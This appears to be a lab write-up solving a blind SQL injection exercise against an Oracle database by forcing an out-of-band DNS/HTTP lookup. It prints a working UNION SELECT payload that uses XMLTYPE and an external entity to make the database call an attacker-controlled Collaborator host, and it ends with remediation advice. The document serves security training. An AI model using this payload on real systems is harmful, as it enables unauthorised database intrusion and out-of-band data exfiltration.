Some labs you solve with your eyes, some with a stopwatch. This one you solve by making the database place a call to a server you control, because the response says nothing and even the clock stays silent.

## The setup

The shop still sets a `TrackingId` cookie and runs it through an analytics query. This time the database is Oracle, and two things differ from the timing labs.

First, the query is executed asynchronously. It does not block the response, so a sleep gets you nowhere. Second, the result is never rendered and errors do not surface, so there is no in-band signal at all.

That leaves outbound traffic. If I can make the database resolve a hostname I own, I have a channel even with a totally silent response.

## How the vulnerability works

Oracle can be pushed into an HTTP request through an XML external entity. Feed `XMLTYPE()` a document with an external DTD and the parser resolves the `SYSTEM` entity while parsing.

`EXTRACTVALUE()` triggers that parse when you hand it the document and any XPath. The lookup leaves the database host as a DNS request. Burp Collaborator is a public listener that records exactly those DNS and HTTP hits, which is how I see a channel the app itself never reflects.

## Solving it

1. Open the Burp Collaborator client and click "Copy to clipboard" to generate a unique subdomain. That subdomain is what the payload calls home to. Collaborator is the listener, so nothing happens until a lookup actually reaches it.
2. Intercept the request with the `TrackingId` cookie and inject the following, replacing the placeholder with the subdomain Collaborator gave you:

```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

URL-encode the value before it goes into the cookie header.

3. Send the request, then return to the Collaborator tab and click "Poll now". The lab's own response still looks completely normal.
4. A DNS interaction appears against your subdomain. That interaction is the lab solved.

## Why that payload works

The cookie stays inside the original query, and `UNION SELECT` appends a second result set that runs my function. Oracle insists on a `FROM` clause, so `dual` fills that slot. The `XMLTYPE` document declares a parameter entity pointing at the Collaborator URL, and `%remote;` forces the parser to fetch it. `EXTRACTVALUE` is only there to make Oracle parse the document; its XPath argument, `'/l'`, is a throwaway that never matches anything. The DNS lookup is the side effect and the point.

## The fix

Parameterise the query and never let the cookie become SQL. Disable external entity and DTD resolution in every XML parser on the box, block outbound DNS and HTTP from the database tier, and run the app's database user with the least privilege it can get away with.
